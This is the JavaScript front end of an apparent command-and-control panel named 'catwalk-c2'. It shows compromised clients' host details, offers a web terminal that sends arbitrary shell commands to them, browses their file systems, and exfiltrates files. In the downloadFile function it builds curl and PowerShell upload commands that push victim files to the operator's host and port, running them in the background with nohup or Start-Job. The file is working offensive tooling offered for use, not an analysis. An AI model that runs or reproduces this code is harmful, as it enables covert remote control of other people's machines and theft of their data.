var jsonData = {}
var uid = gup('uid', false)
var os = ""
var sht = ""
var initXHR = new XMLHttpRequest();
var keepTermQuiet = true
var command = ""
var disableTerm = false
var currentPWD = ""
var hostIP = ""
var uploadPort = ""
var enableCTRLC = false
const sio = io("/");

function gup( name, url ) {
    if (!url) url = location.href;
    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
    var regexS = "[\\?&]"+name+"=([^&#]*)";
    var regex = new RegExp( regexS );
    var results = regex.exec( url );
    return results == null ? null : results[1];
}

initXHR.onload = function() {
    jsonData = JSON.parse(initXHR.responseText)[gup('uid', false)]
    console.log(jsonData)
    var container = document.getElementById("client-info")
    os = jsonData["os"]
    sht = jsonData["shelltype"]

    document.title = "catwalk-c2 | {0}".formatUnicorn({0: jsonData["hostname"]})

    term.open(document.getElementById('terminal'));
    // cool banner = hacker
    term.write(`            
      !           888   )\._.,--....,'\`\`.        888 888      
    .o--.         888  /.   _.. \   _\  (\`._ ,.   888 888      
   \`=,-,-'~~~     888 \`----(,_..'--(,_..'\`-.;.  888 888      
 .d8888b  8888b.  888888 888  888  888  8888b.  888 888  888 
d88P"        "88b 888    888  888  888     "88b 888 888 .88P 
888      .d888888 888    888  888  888 .d888888 888 888888K  
Y88b.    888  888 Y88b.  Y88b 888 d88P 888  888 888 888 "88b 
 "Y8888P "Y888888  "Y888  "Y8888888P"  "Y888888 888 888  888 
    `)
    term.write('\r\n    connected to {ip} ({uid})\r\n'.formatUnicorn({
        "ip": jsonData["ip"], 
        "uid": gup('uid', false)
        }));
    term.write('\r\n$ ');

    var items = ["oui", "os", "arch", "ip", "mac", "shelltype", "hostname"]
    for (var i=0; i<items.length; i++) {
        var span = document.createElement("span")
        span.innerHTML = items[i] + ": " + jsonData[items[i]]
        container.appendChild(span)
        container.appendChild(document.createElement("br"))
    }

    term.onData(e => {
        switch (e) {
            case '\u0003': // Ctrl+C

                if (enableCTRLC == true) {
                    term.write('^C');
                    command = '';
    
                    runCommand(term, '\x03');
                    command = '';
    
                    terminal.write('\r\n$ ');
                }

                if (enableCTRLC == undefined) {
                    term.write('^C now works. Godspeed.')
                    terminal.write('\r\n$ ');
                    enableCTRLC = true
                }

                if (enableCTRLC == false) {
                    term.write('^C does work. This may kill your session. Hit again to confirm.')
                    terminal.write('\r\n$ ');
                    enableCTRLC = undefined
                }


                break;
            case '\r': // Enter
                runCommand(term, command);
                command = '';
                break;
            case '\u007F': // Backspace (DEL)
                // Do not delete the prompt
                if (term._core.buffer.x > 2) {
                    term.write('\b \b');
                    if (command.length > 0) {
                        command = command.substr(0, command.length - 1);
                    }
                }
                break;
            case '\u0009':
                console.log('tabbed', output, ["dd", "ls"]);
                break;
            default:
                if (e >= String.fromCharCode(0x20) && e <= String.fromCharCode(0x7E) || e >= '\u00a0') {
                    if (!disableTerm) {
                        command += e;
                        term.write(e);
                    }
                }
        }
    });
};

initXHR.open('GET', '/api/data/clients', true);
initXHR.send();

var xhrIP = new XMLHttpRequest();
xhrIP.open("GET", "/api/data/host")
xhrIP.onload = function() {
    var parsed = JSON.parse(xhrIP.responseText)
    hostIP = parsed["ip"]
    uploadPort = parsed["upload"]
}
xhrIP.send()

sio.on('clientrx', (msg) => {
    console.log(msg);

    if (Object.keys(msg).includes(uid)) {

        if (keepTermQuiet) {
            return
        }

        if (!keepTermQuiet) {
            term.write(msg[uid])
        }
        
        if ((msg[uid].slice(-1) == '1') && !keepTermQuiet) {
            term.write('\r\n$ ');
        }
    }
});


var term = new window.Terminal({
    cursorBlink: true,
    convertEol: true,
    cols: Math.floor(document.getElementById("terminal").offsetWidth / 12),
    rows: Math.floor(document.getElementById("terminal").offsetHeight / 19),
});

window.addEventListener('resize', () => {
    const cols = Math.floor(document.getElementById("terminal").offsetWidth / 12);
    const rows = Math.floor(document.getElementById("terminal").offsetHeight / 19);
    term.resize(cols, rows);
});

document.getElementById("terminal").addEventListener("click", function() {
    keepTermQuiet = false
})

String.prototype.formatUnicorn = String.prototype.formatUnicorn ||
function () {
    "use strict";
    var str = this.toString();
    if (arguments.length) {
        var t = typeof arguments[0];
        var key;
        var args = ("string" === t || "number" === t) ?
            Array.prototype.slice.call(arguments)
            : arguments[0];

        for (key in args) {
            str = str.replace(new RegExp("\\{" + key + "\\}", "gi"), args[key]);
        }
    }

    return str;
};

function runCommand(terminal, cmd) {
    var xhrRC = new XMLHttpRequest();
    if (cmd == "") {
        return
    }

    if (os == "Linux") {
        cmd = cmd
    } else {
        if (sht == "command prompt") {
            cmd = cmd + "&& echo 1"
        } else {
            cmd = cmd + ";echo 1"
        }
    }
    
    xhrRC.open('POST', '/api/shell/run', true);
    xhrRC.send(JSON.stringify({
        "uid": gup('uid', false),
        "command": cmd,
        "async": true,
    }));

    term.write("\n")
}


function updateFiles(pwd) {
    keepTermQuiet = true
    var xhrUF = new XMLHttpRequest();
    xhrUF.open('POST', '/api/shell/ls', true);
    xhrUF.onload = function() {
        var jsonFiles = JSON.parse(xhrUF.responseText)

        while (document.getElementById("files").firstChild) {
            document.getElementById("files").removeChild(document.getElementById("files").firstChild);
        }

        var button = document.createElement("button")
        button.innerHTML = "<i class=\"fa-solid fa-arrow-left\"></i>.."
        button.addEventListener("click", function() { 
            updateFiles(removeLastFolder(currentPWD))
        })
        document.getElementById("files").appendChild(button)

        currentPWD = jsonFiles["pwd"].replace("/", "\\")
        document.getElementById("pwd").innerHTML = jsonFiles["pwd"].replace("/", "\\")

        for (i=0; i<Object.keys(jsonFiles["directory"]).length; i++) {
            if (jsonFiles["directory"][Object.keys(jsonFiles["directory"])[i]] == "folder") {
                addFile(Object.keys(jsonFiles["directory"])[i], "folder")
            } else {
                addFile(Object.keys(jsonFiles["directory"])[i], "file")
            }
        }
    };

    if (pwd == "") {
        xhrUF.send(JSON.stringify({
            "uid": gup('uid', false)
        }));
    } else {
        xhrUF.send(JSON.stringify({
            "uid": gup('uid', false),
            "pwd": pwd.replace("/", "\\")
        }));
    }
}

function pathJoin(folderPath, filename) {

    folderPath = folderPath.replace(/\\/g, '/');
    filename = filename.replace(/\\/g, '/');

    // Check if folderPath ends with a slash or backslash, and remove it if present
    if (folderPath.endsWith('/') || folderPath.endsWith('\\')) {
        folderPath = folderPath.slice(0, -1);
    }

    // Check if filename starts with a slash or backslash, and remove it if present
    if (filename.startsWith('/') || filename.startsWith('\\')) {
        filename = filename.slice(1);
    }

    // Join the folderPath and filename with a slash or backslash in between
    return `${folderPath}/${filename}`;
}

function removeLastFolder(path) {
    var p = path.replace(/\\/g, '/').substring(0, path.replace(/\\/g, '/').lastIndexOf('/'));
    if (p == "") {
        return "/"
    } else {
        return p
    }
}

function changeDir(directory) {
    console.log(pathJoin(currentPWD, directory))
    updateFiles(pathJoin(currentPWD, directory))
}

function downloadFile(directory, file) {
    var toastShown = false
    Toastify({
        text: "<span style=\"font-family: roboto\">downloading file {0}...</span>".formatUnicorn({0: file}),
        duration: 2.5 * 1000,
        gravity: "top", // `top` or `bottom`
        position: "right", // `left`, `center` or `right`
        stopOnFocus: true, // Prevents dismissing of toast on hover
        style: {
            background: "#121212",
            boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(48,48,48,.3)",
        },
        escapeMarkup: false,
    }).showToast()

    var xhrDF = new XMLHttpRequest();
    xhrDF.open('POST', '/api/shell/run', true);

    var cmd = "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"filename: {2}\" -H \"Authorization: {3}\" -T \"{0}\" \"http://{1}:{4}/\" && echo 1".formatUnicorn({0:pathJoin(directory, file), 1:hostIP, 2:file, 3:uid, 4:uploadPort})

    if (os == "Windows") {
        if (sht == "command prompt") {
            cmd = "start cmd.exe /C "+cmd+" && echo 1"
        } else if (sht == "powershell") {
            cmd = "Start-Job -ScriptBlock { Invoke-RestMethod -Uri 'http://{1}:{4}/' -Method Post -Headers @{ 'Content-Type' = 'multipart/form-data'; 'filename' = '{2}'; 'Authorization' = '{3}' } -InFile '{0}' }; echo 1".formatUnicorn({0:pathJoin(directory, file), 1:hostIP, 2:file, 3:uid, 4:uploadPort})
        }
    } else {
        cmd = "nohup " + cmd + " & && echo 1"
    }

    console.log(cmd)

    xhrDF.send(JSON.stringify({
        "uid": uid,
        "command": cmd,
        "timeout": "4096" // LONG ASS TIMEOUT
    }));
}

function addFile(name, type) {
    var button = document.createElement("button")
    if (type == "folder") {
        button.innerHTML = "<i class=\"fa-solid fa-folder\"></i>" + name
        button.addEventListener("click", function() { changeDir(name) })
    } else if (type == "file") {
        button.innerHTML = "<i class=\"fa-solid fa-file\"></i>" + name
        button.addEventListener("click", function() { downloadFile(currentPWD, name) })
    } else {
        button.innerHTML = name
    }

    document.getElementById("files").appendChild(button)
}


updateFiles("")